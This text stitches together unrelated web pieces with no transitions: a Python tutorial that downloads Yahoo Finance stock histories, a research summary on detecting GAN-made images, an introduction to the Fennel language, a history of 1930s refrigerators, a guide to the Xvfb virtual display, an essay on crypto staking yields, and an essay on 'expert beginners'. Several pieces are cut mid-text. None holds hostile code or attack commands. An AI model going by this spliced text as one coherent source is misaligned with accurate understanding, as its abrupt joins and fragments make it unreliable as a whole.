print("The amount of stocks chosen to observe: " + str(len(tickers)))</code></pre></div>



<p><br>I would recommend using this library because it allows for our list of observable stocks to be dynamic. But if it better suits your analysis, here is an alternative line of code that allows you to type in the stocks you would like to have the program analyze.</p>



<div><pre data-lang="Python"><code>tickers = ["FB", "AMZN", "APPL"]</code></pre></div>



<hr>



<h2>Data Storage</h2>



<p>You need to create a file location on your device to store all of the stock data, but it’s not that simple. This file need to remove old stock data and hold in order to hold only data from the latest iteration of this program.</p>



<p>To do this, <strong>first create the file manually on your computer</strong>. Don’t worry, this is the only time you will have to do this. Then add this code to your program.</p>



<div><pre data-lang="Python"><code>shutil.rmtree("C:\\Users\\Your Path to Desired File Location")
os.mkdir("C:\\Users\\Your Path to Desired File Location")</code></pre></div>



<p>These two lines of code will then remove and recreate that file each time you run this program. Doing this allows for you to clear out the old stock data and make room for the most recent data.</p>



<hr>



<h2>Measure Success</h2>



<p>These two basic lines of code create variables that we are going to use in the next section to gauge the success of your program. </p>



<p>Sometimes Yahoo Finance can fail to retrieve the data for all of the stocks. This does not happen <span>often </span>(maybe once in a thousand stocks), but we still want to know if it does. </p>



<div><pre data-lang="Python"><code>Stock_Failure = 0
Stocks_Not_Imported = 0</code></pre></div>



<h2>Pull From Yahoo Finance</h2>



<p>This section of code may look daunting if you’re new to coding, but don’t worry<span>:</span> it’s not too complicated. Here is a high-level overview of what this code is doing.</p>



<ol><li>Create a while loop to iterate over each stock in our list of tickers (also ensuring that we are making less than 1800 calls).</li><li>Try statement. <ol><li>We tell Yahoo Finance which stock we want to get the data for.</li><li>Specify what kind of data we want about the stock (in this example it is all of the historical price data).</li><li>Pull the data and save it as a csv in the folder specified in the above section.</li><li>Force the program to pause for two seconds so that we don’t overwhelm Yahoo Finance and get kicked out.</li><li>Tell our program the process was successful and then iterate to the next stock.</li></ol></li><li>Catch Statement (to catch value errors that Yahoo Finance might throw, otherwise our program will prematurely end).<ol><li>Print that there was an error.</li><li>Check if the observed stock has failed more than 5 times (this threshold is up to you).</li><li>If it has, move on to the next stock.</li><li>If it has not, try again.</li></ol></li><li>We’re done. Print out how many stocks were successfully imported, and how many were not.</li></ol>



<p>If you’re still confused with a section of this code, I added some comments (words after #) to alleviate any confusion.</p>



<div><pre data-lang="Python"><code>i=0
while (i &lt; len(tickers)) and (Amount_of_API_Calls &lt; 1800):
    try:
        stock = tickers[i]  # Gets the current stock ticker
        temp = yf.Ticker(str(stock))  # Instantiate the ticker as a stock with Yahoo Finance
        Hist_data = temp.history(period="max")  # Tells yfinance what kind of data we want about this stock (In this example, all of the historical data)
        Hist_data.to_csv("C:\\Users\\Your Desired Path to File")  # Saves the historical data in csv format for further processing later
        time.sleep(2)  # Pauses the loop for two seconds so we don't cause issues with Yahoo Finance's backend operations
        Amount_of_API_Calls += 1 
        Stock_Failure = 0
        i += 1  # Iteration to the next ticker
    except ValueError:
        print("Yahoo Finance Back-end Error, Attempting to Fix")  # An error occurred on Yahoo Finance's back-end. We will attempt to retreive the data again
        if Stock_Failure &gt; 5:  # Move on to the next ticker if the current ticker fails more than 5 times
            i+=1
            Stocks_Not_Imported += 1
        Amount_of_API_Calls += 1
        Stock_Failure += 1
print("The amount of stocks we successfully imported: " + str(i - Stocks_Not_Imported))</code></pre></div>



<hr>



<h2>The End?</h2>



<p>That’s it. You now have a dynamic way of filtering through all of the stocks in the NYSE, NASDAQ, and AMEX<span>, p</span>ulling each of the company’s historic price data<span>, a</span>nd saving all of it to a new folder on your device. All <span>at </span>the click of a button. </p>



<p><strong>It’s completely hands-off.</strong></p>



<p>But <span>this isn’t</span> the end. There is so much more of the investing process that you can make hands-off. And why wouldn’t you? It makes life so much easier and investing so much more successful. <strong><a href="https://handsoffinvesting.com/" target="_blank" rel="noreferrer noopener">Everything you need is right here!</a></strong></p>

        <p>The quality of image generation and manipulation is reaching impressive levels, making it increasingly difficult for a human to distinguish between what is real and what is fake. However, deep networks can still pick up on the subtle artifacts in these doctored images. We seek to understand what properties of fake images make them detectable and identify what generalizes across different model architectures, datasets, and variations in training. We use a patch-based classifier with limited receptive fields to visualize which regions of fake images are more easily detectable. We further show a technique to exaggerate these detectable properties and demonstrate that, even when the image generator is adversarially finetuned against a fake image classifier, it still leaves detectable artifacts in certain image patches.</p>

						A Brief Summary:
					</p>
					</span>
					We train classifiers in a fully convolutional manner by truncating a standard deep network architecture after various intermediate layers. This classifier is trained to distinguish between real images and fake or manipulated images, but since it is fully convolutional, it provides us with a prediction of how "real" or "fake" it predicts a given patch of the image to be. One subtle caveat was that we had to be careful with image preprocessing -- we tried to create our dataset so that "real" and "fake" image collections are as similar as possible in terms any resizing done and file format, as we found that a classifier could easily learn these differences rather than the actual task.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/preprocess.001.jpeg"></p><p>
					We train the classifier on fake faces from Progressive GAN, and real faces from the CelebA-HQ dataset afer performing the preprocessing steps above. We then evaluate the truncated classifiers at different receptive field sizes, where higher block number corresponds to larger receptive field/larger patch size, across different synthetic face generators, as well as generators trained on the more diverse FFHQ face datset. Oftentimes, a model with a smaller receptive field can outperform one with a larger receptive field on this task.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/graphs.001.jpeg"></p><p>
					Patch-based predictors give use a natural way to visualize model decisions, as the same model weights are applied over each patch in a sliding fashion. By using a pretrained face segmentation model, we can categorize the most predictive patch in each image to investigate what types of features the patch classifier uses in making a decision.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/visualize.001.jpeg"></p><p>
					One of the dangers of image synthesis is that the generators are constantly evolving and getting better, so we investigate how patch cues change as a result of changes in the generator. We finetune the generator and recompute the most predictive patches, and we also use the generator as a tool to exaggerate what makes images look fake by optimizing against the classifier in latent space.</p><p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header>

</header>
<p>Fennel is a programming language that runs on the Lua runtime.</p>
<h2 id="why-lua">Why Lua?</h2>
<p>The Lua programming language is an excellent and very underrated tool. Is it remarkably powerful yet keeps a very small footprint both conceptually as a language and in terms of the size of its implementation. (The reference implementation consists of about nineteen thousand lines of C and compiles to 278kb.) Partly because it is so simple, Lua is also extremely fast. But the most important thing about Lua is that it’s specifically designed to be put in other programs to make them reprogrammable by the end user.</p>
<p>The conceptual simplicity of Lua stands in stark contrast to other “easy to learn” languages like JavaScript or Python–Lua contains very close to the minimum number of ideas needed to get the job done; only Forth and Scheme offer a comparable simplicity. When you combine this aggressive simplicity with the emphasis on making programs reprogrammable, the result is a powerful antidote to prevailing trends in technology of treating programs as black boxes out of the control of the user.</p>
<h2 id="and-yet">And yet…</h2>
<p>So if Lua is so great, why not just use Lua? In many cases you should! But there are a handful of shortcomings in Lua which over time have shown to be error-prone or unclear. Fennel runs on Lua, and the runtime semantics of Fennel are a subset of Lua’s, but you can think of Fennel as an alternate notation you can use to write Lua programs which helps you avoid common pitfalls. This allows Fennel to focus on doing one thing very well and not get dragged down with things like implementing a virtual machine, a standard library, or profilers and debuggers. Any tool that already works for Lua will work just as well for Fennel.</p>
<p>The most obvious difference between Lua and Fennel is the parens-first syntax; Fennel belongs to the Lisp family of programming languages. You could say that this removes complexity from the grammar; the paren-based syntax is more regular and has fewer edge cases. Simply by virtue of being a lisp, Fennel removes from Lua:</p>
<ul>
<li>statements (everything is an expression),</li>
<li>operator precedence (there is no ambiguity about what comes first), and</li>
<li>early returns (functions always return in tail positions).</li>
</ul>
<h2 id="variables">Variables</h2>
<p>One of the most common legitimate criticisms leveled at Lua is that it makes it easy to accidentally use globals, either by forgetting to add a <code>local</code> declaration or by making a typo. Fennel allows you to use globals in the rare case they are necessary but makes it very difficult to use them by accident.</p>
<p>Fennel also removes the ability to reassign normal locals. If you declare a variable that will be reassigned, you must introduce it with <code>var</code> instead. This encourages cleaner code and makes it obvious at a glance when reassignment is going to happen. Note that Lua 5.4 introduced a similar idea with <code>&lt;const&gt;</code> variables, but since Fennel started from a clean slate it was able to make the cleaner choice be the default rather than opt-in.</p>
<h2 id="tables-and-loops">Tables and Loops</h2>
<p>Lua’s notation for tables (its data structure) feels somewhat dated. It uses curly brackets for both sequential (array-like) and key/value (dictionary-like) tables, while Fennel uses the much more familiar notation of using square brackets for sequential tables and curly brackets for key/value tables.</p>
<p>In addition Lua overloads the <code>for</code> keyword for both numeric “count from X to Y” style loops as well as more generic iterator-based loops. Fennel uses <code>for</code> in the first case and introduces the <code>each</code> form for the latter.</p>
<h2 id="functions">Functions</h2>
<p>Another common criticism of Lua is that it lacks arity checks; that is, if you call a function without enough arguments, it will simply proceed instead of indicating an error. Fennel allows you to write functions that work this way (<code>fn</code>) when it’s needed for speed, but it also lets you write functions which check for the arguments they expect using <code>lambda</code>.</p>

<p>If you’ve been programming in newer languages, you are likely to be spoiled by pervasive destructuring of data structures when binding variables, as well as by pattern matching to write more declarative conditionals. Both these are missing from Lua and included in Fennel.</p>
<p>Finally Fennel includes a macro system so that you can easily extend the language to include new syntactic forms. This feature is intentionally listed last because while lisp programmers have historically made a big deal about how powerful it is, it is relatively rare to encounter situations where such a powerful construct is justified.</p>

					<p>The evolution of the household refrigerator is not a well known story. &nbsp;There seems to be few people interested in the subject. &nbsp;Perhaps it is not as romantic as the development of the automobile. &nbsp;Nonetheless, a concerted effort was put forth in the 1920s and 1930s to produce a cheap, reliable, efficient domestic refrigerator. &nbsp;From books I’m reading on the subject, the great diversity of refrigerator manufacturers in the United States that existed in the 1920s, seems to be boiled down to a handful of companies in the depression era. &nbsp;In the most recent book, “Household Electric Refrigeration” by John F. Wostrel and John G. Praetz 1938; the models described were made by manufacturers, many still around today (or owned by yet larger companies) including General Electric, Frigidaire, Kelvinator, Norge, Grunow, Crosley, Sparton, Hotpoint, Coldspot, Copeland, Ice-O-Matic and Westinghouse.</p>

<p>One of the most noticeable differences between refrigerators in the mid 1930s and today was the refrigerants they used and the refrigerants charges required for operation. &nbsp;A very common refrigerant, Sulpher Dioxide had been in use fora number of years and still appeared to dominate the market at this time, not to say that proprietary chemical refrigerants weren’t beginning to take a large part of the market. &nbsp;F-12 was one of these proprietary substances that would later dominate the refrigerator industry. &nbsp;It was stable up to high temperatures, didn’t stink like SO2 when it leaked, was relatively safe if exposure to it was kept to a minimum, and it has a much lower boiling point than several common refrigerants at the time which means that systems operating F-12 remained in a positive pressure state throughout the cycle. &nbsp;Refrigerators with F-114, SO2, Isobutane and Methyl Formate required a vacuum in the low side of a vapor compression system. &nbsp;This was generally viewed as problematic seeing that if a leak formed in the low side of the system, for instance, around the packing seal of an open drive compressor, atmosphere would leak into the system, bringing non-condensable gases and water vapor. &nbsp;This leads to high head pressures, oil contamination, possible acid formation, corrosion and refrigerant control freeze ups. &nbsp;A curious refrigerant used rarely was Carrene, also known as Dichloromethane which has a boiling point of 104 degrees F at atmospheric pressure. &nbsp;This means both the suction and discharge sides of a system would operate in a vacuum state. &nbsp;Very curious. &nbsp;As I said, the refrigerant charges were unusual as well. &nbsp;The compressors of these systems were rated not much &nbsp;larger than modern day compressors from 1/16 HP up to 1/4 HP, but they had typical charges of 1# to perhaps 3.5# &nbsp;and more depending on the manufacturer. &nbsp;Modern refrigerators have charges measured in ounces, perhaps, 4 oz.. Most of these machines had liquid receivers that held excess refrigerant and ensured a pure liquid supply to the refrigerant control. &nbsp;That excess refrigerant would have allowed continued operation with minor leaks in the system. &nbsp;Another reason for the large charges is the construction of the evaporator which was commonly gravity flooded; a vessel and series of tubes holding refrigerant under low pressure, boiling away to vapor as heat is absorbed from the refrigerated cabinet.<span id="more-4087"></span></p>

<p>Above, is one of these low side float assemblies. &nbsp;These seemed to be falling out of favor by the mid 1930s for various reason having to do with expense and reliability. &nbsp;The float valve simply regulated the volume of liquid refrigerant within the evaporator shell which was maintained at suction pressure. &nbsp;As the refrigerant boiled away and was carried to the compressor, the ball would drop, valve open and additional high pressure liquid would be admitted. &nbsp;When implemented properly, the low side float gravity flooded evaporator has many advantages over the high side float or the dry type evaporator. &nbsp;It was very important that these machines were properly leveled when installed. &nbsp;They definitely had a minimum charge volume below which the float valve would continually call for more refrigerant and when it was not available, the valve would remain open, leaving very little pressure drop between the high and low side resulting in little to no refrigerating effect. &nbsp;A large refrigerant charge could simply be handled with a sufficiently sized liquid receiver. &nbsp;(Also read <a href="https://musingsonentropy.wordpress.com/2013/04/18/the-great-gravity-flooded-evaporator/" target="_blank">The Great Gravity Flooded Evaporator</a>)</p>

<p>This Coldspot has some features worth discussing. &nbsp;For one, it is the package type as described before with the compressor and condensing unit mounted atop the insulated cabinet top with the motor and compressor supported my springs to dampen vibration and noise. &nbsp;The evaporator is of the dry type where the refrigerant is fed to a long coil of tube or series of tubes at approximately the rate in which it is vaporized by the heat of the refrigerated cabinet. &nbsp;Some of the more crude early versions of this used a fixed orifice called a “restrictor”, having a fixed, triangle shaped opening to pass high pressure liquid refrigerant to the evaporator. &nbsp;Before the capillary tube came into use (invented in the late 20s) was the Automatic Expansion Valve which is little more than a pressure regulating valve maintaing a constant pressure within the evaporator coil, often with an adjustable spring compression. &nbsp;This knob or screw would often go out of adjustment because of the constant freeze/thaw occurring at these valves. &nbsp;They were often equipped with a rubber cap or boot to keep moisture from interfering with the adjustment. &nbsp;These AXVs work well in constant load conditions, but under high load tend to starve the evaporator of refrigerant and risk slugging liquid back to the compressor under low load. &nbsp;The improvement to these valves came with the addition of a thermostatic element or “sensor bulb” strapped to the suction line, the temperature of which alters the pressure within the the bulb and in turn, operates a diaphragm inside the valve to properly feed the correct amount of refrigerant to the coil given the conditions. &nbsp;This type of valve would be called a Thermostatic Expansion Valve.</p>

<p>A very simple dry type evaporator with and AXV. &nbsp;Notice the Thermostatic Control Switch. &nbsp;This has nothing to do with the refrigerant supply, but simply controls the electrical current to the compressor and allows the operator to adjust the cabinet temperature. &nbsp;These worked with a thermostatic bulb strapped to the evaporator, suction line or somewhere else in the cabinet. &nbsp;The Thermostat was a great improvement over the controls of the 20s which sometimes used a pressure operated switch tied into the suction line. &nbsp;The service or replacement of these complicated switches could involved breaking the sealed refrigerant line.</p>

<p>An AXV on a dry type coil, but rather than direct expansion, this is a brine tank. &nbsp;The refrigerant tube passes through of a low freezing point brine which in turn froze ice cubes and chilled the space. &nbsp;These had the advantage of having a holdover effect to keep the cabinet cold and prevent short cycling of the compressor and also had a more constant loading effect on the AXV which made for more consistent and predictable performance. &nbsp;The down side of a brine system is the possible corrosive effects of the brine, extra cabinet space taken and the lower evaporator temperatures possibly needed to chill the brine to a temperature that it could in turn chill the refrigerator.</p>

      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I run some programs, which normally run on a local computer with a graphical display, in Docker container, they would somehow fail. Sometimes, I need to run many simulations that have GUIs simultaneously, and I don’t want to see those GUIs at all. Is there any virtual display which allows me to put the graphics into? The answer is yes and we could use X virtual framebuffer, Xvfb.</p>



<p>In this blog post, I would like to take you to glimpse the X server-client architecture for displaying graphics, and discuss how to use Xvfb.</p>

<h3 id="x-server-client">X Server-Client</h3>

<p>In computing, the X Window System, commonly known as X11 or X, is a network-transparent windowing system for bitmap displays. X uses a client-server model. An X server program runs on a computer with a graphical display and communicates with various client programs.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-07-01-Running-X-Client-Using-Virtual-X-Server-Xvfb/2000px-X_client_server_example.svg.png">
    <figcaption>X Server-Client Architecture</figcaption>
</figure>
</div>

<p>Any application that requires GUI and interacts with X server program is called X client. X client typically includes applications such as OS GUI, web browser, most of the games, and so on. Without X server, some of those programs would fail to run.</p>



<p>X server requires a graphical display. Without a graphical display, X server will not start and thus all the X clients that must run on a X server would fail.</p>



<p>In some scenarios where X server is not started or there is no display, we would still like to run X clients, we should use a virtual X server to host the X clients. Instead of outputting signals to screen, the virtual X server outputs signals to memory. This will be very useful for running programs, especially those whose display graphics are not important, in Docker container or on remote servers. For example, if you would like to watch a live streaming on a remote server without graphical display and take some snapshots routinely every 5 minutes, virtual X server will be very helpful. In fact, some libraries, such as Matplotlib (without using agg backend) and TikZ requires to be hosted on X server. If there is no display, say in a Docker container, running the programs that use those libraries will fail.</p>

<h3 id="x-virtual-framebuffer-xvfb">X Virtual Framebuffer (Xvfb)</h3>

<p>Xvfb or X virtual framebuffer is a display server implementing the X11 display server protocol. In contrast to other display servers, Xvfb performs all graphical operations in virtual memory without showing any screen output.</p>



<p>To install Xvfb, please run the following commands in the terminal.</p>

<div><div><pre><code><span>$ </span><span>sudo </span>apt update
<span>$ </span><span>sudo </span>apt <span>install </span>xvfb ghostscript
</code></pre></div></div>



<p>Once the <code>xvfb</code> and <code>ghostscript</code> are installed, we could start any X client in the terminal using <code>xvfb-run</code>.</p>

<div><div><pre><code><span>$ </span>xvfb-run firefox
<span>$ </span>xvfb-run python plot.py
</code></pre></div></div>

<h3 id="conclusions">Conclusions</h3>

<p>Xvfb would be very useful for a lot of GUI based simulations running in Docker container or remote server.</p>

<div>
<p>In 2017/18 cryptocurrencies went through a speculative bubble that saw its flagship currency Bitcoin reach peaks of $20,089 and a market cap of $320 billion. At the height of euphoria, the total market cap of all cryptocurrencies reached $790 billion. While Bitcoin and other cryptocurrencies (known as altcoins) have been around since 2009, it was the consolidation of mindshare and public interest in 2017 and 2018 that has made it a mainstay for alternative investors. But the fact remains that we are yet to see the adoption event that will make it a mainstay for all investors.</p>



<p>Most recently Cryptocurrencies have once again found a place in the news cycle following two years of dormancy post the bubble. The central trend appears to be around the phenomenon of decentralised finance otherwise known as DeFi. The quantity of activity and community participation in DeFi and related activities have been pointed to as potential indicators of a return to the speculative mania that took place in 2017. By the end of July, the total value locked up in DeFi related projects was $4 billion. A somewhat marginal amount given that Bitcoin is now over $200 billion in valuation and the whole market for cryptocurrencies is approaching $350 billion.</p>



<p>Regardless, DeFi represents a strong use case for cryptocurrencies as a means to provide lending and borrowing capabilities and is also geared to attract significant speculative interest. One of the most basic and pervasively engaged features of DeFi at present is yield farming. Cryptocurrency assets can earn or ‘farm’ yields in three main forms:</p>



<ol><li>Participating in financial products as one would in traditional markets</li><li>Locking up some cryptocurrency liquidity in return for an interest-like reward.</li><li>Staking cryptocurrency (like collateral) to fortify the security of a Proof-of-Stake based blockchain platform, where ‘staking’ some tokens prevents malicious activity similar to how a collateralized loan prevents default risk.</li></ol>



<p>However, the attention decentralised finance (DeFi) is getting right now, looks more like a bubble than a catalyst for adoption, where volatility (price, scams, hacks etc) of the industry hasn’t been solved.</p>



<p>The question then is, what is a catalyst for adoption? Given that financial products (form 1) on any platforms, blockchain or otherwise, can provide yields through participation, let us focus on yield farming native to the nature of blockchain (forms 2 &amp; 3), Proof-of-Stake – where providing security/liquidity returns yields.</p>



<p>Proof-of-Stake is simply the mechanism whereby a decentralised platform is able to provide security against attacks on the immutability of the ledger on the blockchain. The name holds the key to understanding this mechanism where ‘staking’ (locking up) the currency on the platform, is the means by which you are able to validate transactions on the ledger (the state of the blockchain) and add to the ledger. The game theory of securing the chain via staking is tied to rewards for being a good actor and penalties for being a bad actor. These rewards represent the yields earned for securing the chain.</p>



<p>What is particularly interesting as the speculation starts to ramp up once more is that Proof-of-Stake based platforms are gaining more attention because of their ability to provide yields in return for a financial stake in the platform. Yields on a Proof-of-Stake network represents a passive income avenue for a spectrum of individual/retail investors all the way to institutional players. This differs from the Proof-of-Work mechanism, most popularly represented by Bitcoin, which consumes electricity (mining) to secure the ledger. Where mining BTC is more difficult and less accessible to the spectrum of investors (currently there are a few large mining farms that make this their primary occupation) most BTC investors will make capital gain returns based on price appreciation through adoption. In the absence of BTC becoming a true global currency it will depend on a series of consolidating speculative bubbles to edge toward adoption – a chicken and egg problem perhaps sped along by the more consistent rewards associated with Proof-of-Stake.</p>



<h3>Yields: A Ponzi scheme or a catalyst for cryptocurrency adoption?</h3>



<p>Thus far the speculation on the future potential of blockchain technology, and cryptocurrencies by extension, is what gives the industry the large valuation it holds, even as use cases seem scarce or utilised by few.</p>



<p>In such a case, providing yields for no inherent value due to lack of use case, appears more like a Ponzi scheme than investment in a nascent technology. The idea is that when more people take a financial stake in the platform and lock up those funds for yields, all the prior participants will continue to benefit, not only from the yields but also from the price appreciation of the currency and market capitalisation of the platform. Of course, the integrity of the platform will only be realised when the use cases are actualised at some point in the future. In the interim, the Ponzi characteristics are exacerbated by the lucrative yield returns (often ranging from 5-20% per annum) made available by Proof-of-Stake networks, in comparison to traditionally available yield/interest earning financial products. It’s important to note that platforms vary in risk and reliability, we can liken it to investing in financial products across different tranches – some more junk-like than others.</p>



<p>Bitcoin, on the other hand, provides an entirely different avenue of investment in blockchain but comes with its own set of challenges – namely the chicken and egg problem we discussed above. Bitcoin requires the expense of electricity through mining activities to secure the network and ‘earn’ Bitcoin. While the rewards for mining on a Proof-of-Work network can be equated to the yields earned for staking on a Proof-of-Stake network, the ‘work’ performed for Proof-of-Work (cost of time and initial investment) makes it impossible for it to operate like a Ponzi scheme. Essentially, this means that Bitcoin can’t propagate its adoption through the mechanism of mining, where mining does not lend itself to the low-effort traits of Proof-of-Stake currently attracting attention to the DeFi bubble.</p>



<p>The lower effort in work required to secure the Proof-of-Stake network allows more users to participate meaningfully and earn yields. This is the beginning of a solution to the chicken and egg problem, where increased participation can bolster the market capitalisation required for widespread traction. In summary, easier participation increases the likelihood of network effect for a platform, where earning yields becomes the initial use case for the platform – as risky or unreliable as it may seem. Increased traction over time is very capable of evolving the volatile and Ponzi-like DeFi space into a mature financial structure supporting the blockchain ecosystem.</p>



<p>During 2017/18 the prevailing narrative of Proof-of-Work and crypto’s use case as a currency was not substantiated and resulted in a bubble rather than an adoption event. While it gained attention on the global stage, the widely held perception was that there was no immediately apparent use case that could sustain and grow its valuation beyond pure speculation. In the last couple of years following the bust of the speculative bubble, Proof-of-Stake has become a more significant narrative for the industry. The most marked indicator being Ethereum (currently Proof-of-Work), the second largest cryptocurrency, indicating its intent to transition to a Proof-of-Stake network.</p>



<p>The narrative of Proof-of-Stake is ballooning out quite rapidly, popularly considered to be propagated by the perceived benefits for scaling transaction capacity. However, what we have identified is that the use case of earning yields has the potential to catalyse the next boom cycle similar to 2017/ 18, and perhaps even to a greater extent. Even in the absence of yields as a catalyst for the next boom cycle, it represents a solid use case as a financial ecosystem to sustain speculative value and drive cryptocurrencies closer to mainstream use.</p>

I apply this in assignments and Kaggle and everything works fine—this is the <em>narrow</em> context.</p>

<p>Then, perhaps I get the opportunity to apply my new skills in a <em>wider</em> context—I build a model, validate it (via random train-test split), and deploy it. However, the offline and online (i.e., A/B test) metrics don’t match up. Eventually, I figure out that I should use a <a href="https://www.fast.ai/2017/11/13/validation-sets/" target="_blank">time-based split</a> so future data doesn’t <em>leak</em> into the training set.</p>

<p>With the benefit of the wider context, I encountered challenges and failures (read: lessons) that were not part of the MOOC assignments. As a result, I got to see the bigger picture; I know there’s still lots to learn. Thus, I continue to learn and progress through the stages of beginner, intermediate, and so on.</p>

<blockquote>
  <p>The more I learn, the more I realise how much I don’t know. – Albert Einstein</p>
</blockquote>

<h2 id="from-beginner-to--expert-beginner">From beginner to … expert beginner</h2>

<p>But what happens if I <em>don’t</em> see the bigger picture?</p>

<p>Let’s assume I work in the HR department of a widget manufacturer. Everything—from headcount to payroll to vacation balance—is run in Excel. I apply my newfound <code>R</code> skills to automate my work via one-off scripts. This involves calculating statistics on factory sites and displaying it via a <code>Shiny</code> dashboard on the department desktop. In the eyes of my manager and team, I’m an absolute rockstar ninja wizard. I get showered with praise and am promoted to manager of HR data science.</p>

<p>I might not know about proper ML validation, deployment, unit tests, or even version control. I certainly haven’t done any of that. But who cares? We don’t need it. I’m now the manager of HR data science. I’m now… an “expert”.</p>

<p>To those in the know, I’m clearly still a beginner. But my context is narrow and I don’t see the bigger picture. Thus, I don’t know that there’s still lots to learn, lots to do. However, because I’ve achieved a modicum of success (through <em>narrow</em> applications of what I learned) and others call me an expert, I now view myself as an expert. As a result, I stop learning. I’m now stuck at a local optima. <strong>I’ve become an <a href="https://daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner/" target="_blank">expert beginner</a></strong>.</p>

<p>Suppose I stay in that same role, within HR, for 10 years. At the end of it, do I have 10 years of experience, or one year of experience repeated 10 times?</p>

<details><summary>An army of expert beginners led by an expert beginner</summary>
<div>

<p>As head of HR data science, I hire a team of data scientists. Eventually, some team members will suggest new technology (e.g., Python, Docker) or practices (e.g., version control, unit testing).</p>

<p>However, I’m the most experienced (read: longest tenure) and the expert-est expert. I dismiss ideas and technology that I’m unfamiliar with. “Oh, I see you’re new here. Yes, Python sounds like a good idea but the Chief HR Officer really likes the <code><span>Shiny</span></code> dashboard that I built.” “Haha, we don’t need unit tests! I live and breathe this code every day—there’s no need to test it”.</p>

<p>Team members who can see the bigger picture are disappointed by the outdated technology and incorrect practices. They see no room for learning and growth. As a result, <strong>the most talented and ambitious leave</strong> (if they know what’s best for them). For those who stay—hurray! There’s less competition. They’ll toe the line and one day, they’ll be a <em>senior</em> expert beginner and teach new joiners their “expert” ways.</p>

<p>This leads to the <a href="http://brucefwebster.com/2008/04/11/the-wetware-crisis-the-dead-sea-effect/" target="_blank">Dead Sea effect</a> where you’re <strong>left with your least talented and effective</strong> people. They’re grateful to have a job and settle in for a couple of years (or decades). Now, the team has (d)evolved into an army of expert beginners who follow the directions of the top expert beginner.</p>

<p>Because expert beginners have learned “everything” there is to learn, tried “everything” there is to try, and done “everything” there is to do, there’s nothing new to learn, try, and do. The team stops trying new ideas—“Oh we don’t use Docker here. We have VMs!”—and the organization stops innovating.</p>

<p>This partly explains some industries getting disrupted. The iPhone disrupting Nokias and Blackberrys, AWS disrupting on-premise hardware, Stripe disrupting payment processing, Tesla disrupting… you get the idea.</p>

<p>The expert beginner doesn't see the bigger picture; thus, he is stuck.</p>

<h2 id="the-beginners-mind-is-always-a-student">The beginner’s mind is always a student</h2>

<p>How do we prevent stagnation (and possibly becoming an expert beginner)? How do we stay open-minded and constantly learning and experimenting?</p>

<p><strong>One way is <a href="https://en.wikipedia.org/wiki/Shoshin" target="_blank">Shoshin</a> (beginner’s mind)</strong>. It’s a concept from Zen Buddhism on having an attitude of openness, eagerness, and no preconceptions, even when our knowledge of the subject is advanced. In other words, to think <em>just</em> like a beginner.</p>

<blockquote>
  <p>In the beginner’s mind there are many possibilities, but in the expert’s there are few. – Shunryu Suzuki</p>
</blockquote>

<p>With beginner’s mind, regardless of your experience and expertise, you <strong>stay curious and approach new ideas and experiences as a student</strong>. Even when new technology or methods don’t fit your paradigm, you’re open to learning and trying it. Students don’t say “That’s not how we do things here”.</p>

<p>Sometimes, when others view us as experts, we let it get to us. We stay within our narrow subject matter expertise and stop exploring new ideas and possibilities. We avoid newer, bigger challenges so we don’t make mistakes; we stick to what has worked in the past. This helps preserve our expert identity.</p>

<blockquote>
  <p>The most dangerous phrase in the language is, “We’ve always done it this way.” – Grace Hopper</p>
</blockquote>

<p>But this doesn’t make sense. In my field of data science, new tools (e.g., Spark, Docker, Airflow) and methods (e.g., embeddings, attention, pre-training) constantly improve on the state of the art (SOTA)—it’s useful, if not essential, to keep up to date. (That said, fundamental techniques like regression and decision trees are often a solid baseline.)</p>

<h2 id="the-beginners-mind-keeps-on-pedalling">The beginner’s mind keeps on pedalling</h2>

<p>Learning is like cycling. When we start pedalling (from a standstill), it takes effort and time to gain momentum. Nonetheless, we’ll pick up speed and begin gaining distance.</p>

<p>We might look back at where we started and think “Wow, I’ve come a long way. Perhaps I don’t have to pedal as hard; perhaps I don’t have to pedal at all.” If we stop pedalling, the initial momentum might carry us slightly further, but eventually, we’ll come to a standstill. While we don’t lose the distance covered, we’re not gaining distance either. (Though in fast-paced fields like tech, if you don’t move forward, <em>you begin to move backward</em>.)</p>

<p>Here, distance is knowledge (and achievements); momentum is learning. While distance is correlated with expertise, the relationship is not as strong as we think (e.g., one year of experience repeated 10 times). I think momentum (the ability to learn and adapt quickly) is part of expertise as well. The experts I know are often reading or hacking. At work, they can synthesize their mental prototypes and tailor solutions based on context.</p>

<p>To maintain momentum, <strong>the beginner’s mind continues to pedal regardless of the distance they’ve covered</strong>. It’s not surprising that many successful people are—and continue to be—voracious readers and learners. Warren Buffet, Bill Gates, Elon Musk, just to name a few. Do you know any successful person that doesn’t read or learn?</p>

<blockquote>
  <p>The illiterate of the 21st century will not be those who cannot read and write, but those who cannot learn, unlearn, and relearn. – Alvin Toffler</p>
</blockquote>

<details><summary>Note: Not all knowledge is the same</summary>
<div>

<p>There’s knowledge that we gain from books and courses—we’re tested on this in exams. Then, there’s <a href="https://commoncog.com/blog/the-tacit-knowledge-series/" target="_blank">(tacit) knowledge</a> that we gain from practice—we’re tested on this in life.</p>

<div>

<blockquote><div lang="en" dir="ltr"><p>You cannot get educated by this self-propagating system in which people study to pass exams, and teach others to pass exams, but nobody knows anything.</p><p>You learn something by doing it yourself, by asking questions, by thinking, and by experimenting. 🧠</p></div>— Richard Feynman (@ProfFeynman) <a href="https://twitter.com/ProfFeynman/status/1295411496407556096?ref_src=twsrc%5Etfw">August 17, 2020</a></blockquote>

</div>

<p>For example, learning to ride a bicycle. We can’t learn to ride a bike by reading a textbook. The <strong>only way to learn is by actually doing it</strong>. We’re going to lose balance and fall, but eventually, we’ll figure it out. Also, our ability to ride a bike is <strong>transferable</strong> to other two-wheeled transport. Once we learn how to ride a regular bike, we’ll have a gentler learning curve on mountains bikes, tandem bikes, and even e-scooters.</p>

<p>Similarly, some skills and knowledge <strong>can only be gained through practice</strong>. They’re usually <strong>transferable</strong> across multiple domains too. For example, what’s the most suitable way to <a href="https://bugra.github.io/posts/2020/5/25/how-to-serve-model/" target="_blank">serve models in production</a>? There are some common patterns: compute offline and cache, serve via microservice, embed in the main app. Do these patterns differ across domains? Not much. Which is the best approach for our use case? Well, it depends—knowing the answer is tacit knowledge.</p>



